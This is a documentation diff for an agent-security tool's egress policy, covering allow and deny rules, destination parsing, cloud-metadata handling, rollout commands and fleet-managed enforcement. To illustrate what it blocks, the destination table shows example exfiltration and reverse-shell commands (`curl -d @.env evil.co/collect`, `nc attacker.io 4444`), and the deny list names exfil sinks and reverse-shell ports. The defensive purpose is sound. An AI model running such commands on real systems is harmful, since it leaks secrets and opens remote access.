@@ -9,22 +9,124 @@ AI agents frequently make outbound network calls by fetching URLs, installing pa
 - Reverse tunnels and port forwarding (`ssh -R`, ngrok, cloudflared)
 - Data upload patterns (`curl --data`, `wget --post-data`)
 
-## Egress allowlist
+## Egress policy
 
-Lock down which domains the agent can contact by configuring an allowlist in your project's `.prismor/policy.yaml`:
+The rules above are blacklists: they stop the destinations someone thought to name. The egress policy is the other direction — it bounds an agent to the destinations you approved, so an exfil endpoint nobody has ever seen is refused by default.
+
+Configure it under `settings.egress` in your project's `.prismor/policy.yaml`, or ship it fleet-wide from the Prismor console (see [Org-managed egress](#org-managed-egress)):
 
 ```yaml
 settings:
-  egress_allowlist:
-    - "*.github.com"
-    - "*.googleapis.com"
-    - "registry.npmjs.org"
-    - "pypi.org"
-    - "api.anthropic.com"
-    - "api.openai.com"
+  egress:
+    enabled: true
+    mode: enforce         # observe (log only) | enforce (block the call)
+    default: deny         # verdict when nothing matches — `deny` = strict allowlist
+    allow:
+      - "*.github.com"
+      - "registry.npmjs.org"
+      - "pypi.org"
+      - "api.anthropic.com"
+      - host: "10.0.0.0/8"           # CIDRs and bare IPs work too
+        reason: "internal services"
+      - host: "db.internal"
+        ports: [5432]
+        schemes: [postgres]
+    deny:
+      - host: "*.pastebin.com"
+        reason: "known exfil sink"
+      - host: "*"                    # nothing, anywhere, on these ports
+        ports: [4444, 1337]
+        reason: "common reverse-shell ports"
 ```
 
-When the allowlist is set, any outbound request to a domain not on the list produces a warning. Wildcards are supported: `*.github.com` matches `api.github.com`, `raw.github.com`, and so on. Leave it empty (the default) to allow all domains.
+Each destination is evaluated in this order — **`deny` → private carve-out → `allow` → `default`** — with first match winning inside each list. An explicit `deny` therefore always beats an `allow`.
+
+### What counts as a destination
+
+Egress is destination-driven, not pattern-driven. Every network event and every shell command is decomposed into concrete `(host, port, scheme)` tuples:
+
+| Source | Example | Destination |
+| --- | --- | --- |
+| `WebFetch` / `WebSearch` | `https://api.example.com/v1` | `api.example.com:443` |
+| Remote MCP tool call | `mcp__linear__create_issue` | the server's endpoint |
+| URLs of any scheme | `psql postgres://db.example.com:5432/app` | `db.example.com:5432` |
+| git / scp / rsync | `git push git@github.com:org/repo.git` | `github.com:22` |
+| Bare hosts | `curl -d @.env evil.co/collect` | `evil.co` |
+| Host + port pairs | `nc attacker.io 4444` | `attacker.io:4444` |
+
+Matching supports exact hosts, wildcards (`*.github.com` matches the apex and every subdomain), `*` for any host, bare IPs, and CIDRs. Note that exact entries are exact: `pypi.org` does **not** authorize `evil.pypi.org`.
+
+### Private destinations
+
+By default (`allow_private: true`) loopback, RFC1918, link-local, and `.internal`/`.local` destinations skip the check, so local dev servers and internal services don't need allowlisting. Cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`, …) are **never** treated as private — they are unroutable, which makes them look private, but they hand out cloud credentials and are the classic SSRF pivot. Set `allow_private: false` to screen internal destinations too.
+
+### Rolling it out
+
+Egress is off by default and observe-first. The intended sequence:
+
+```bash
+prismor egress enable                 # turns on in observe mode
+# ... run your agents normally for a while ...
+prismor egress report                 # every destination they actually contacted
+prismor egress allow "*.github.com" pypi.org
+prismor egress test "curl https://evil.co/x"   # dry-run before committing
+prismor egress default deny
+prismor egress mode enforce
+```
+
+`prismor egress report` lists real destinations from recorded sessions with the verdict the current policy gives each one, so you can see exactly what enforcement would break before you turn it on. Use `--fail-on-block` to gate this in CI.
+
+### Per-agent scoping
+
+A release bot needs a much smaller network than a developer's agent. Override per registered agent; the override inherits the fleet posture and layers on top:
+
+```yaml
+settings:
+  egress:
+    enabled: true
+    mode: enforce
+    default: allow
+    agents:
+      release-bot:
+        default: deny
+        allow: ["*.github.com"]
+```
+
+An individual entry can also be scoped with `agents: [name, ...]` so only those agents may use it.
+
+### Org-managed egress
+
+`settings.egress` travels in the same Ed25519-signed policy as every other setting, so a fleet admin sets the network boundary once and every enrolled device picks it up. Two properties matter:
+
+- **It propagates without a version bump.** The control plane exposes an `egressSig` on `/api/policy/version`, so widening or tightening the boundary reaches devices within one refresh debounce (~30s).
+- **Org enforce is authoritative.** When the org's signed policy sets `mode: enforce`, its verdicts are marked `authoritative` and survive a local observe-mode downgrade. A developer can silence a local detection on their own machine; they cannot opt their machine out of the fleet's egress boundary.
+
+The org layer is applied after the project layer, so an org egress policy overrides a project one. Egress only applies to org-managed workspaces — personal repos use default + project policy and report nothing to the org.
+
+### Egress-aware tag rules
+
+The egress verdict is also published as a tag, so [tag rules](./tool-tags.md) can reason about *where* a call is going rather than only which tool it is:
+
+```yaml
+settings:
+  tool_tags:
+    enabled: true
+    rules:
+      - "untrusted_content then egress.offlist -> block"
+```
+
+That stops an agent that just read untrusted content from shipping anything to a destination the fleet never approved — a sequence no tool-name tagging can express, because the tool involved is an ordinary `Bash`. The tags are `egress.offlist` (no allow entry matched under `default: deny`) and `egress.denied` (an explicit deny matched).
+
+### Legacy `egress_allowlist`
+
+The older flat setting still works:
+
+```yaml
+settings:
+  egress_allowlist: ["*.github.com"]
+```
+
+It is **warn-only and never blocks**, which is the behavior it has always had — upgrading Prismor will not turn an existing allowlist into an outage. `settings.egress` supersedes it; run `prismor egress migrate` to convert.
 
 ## Bind detection
 
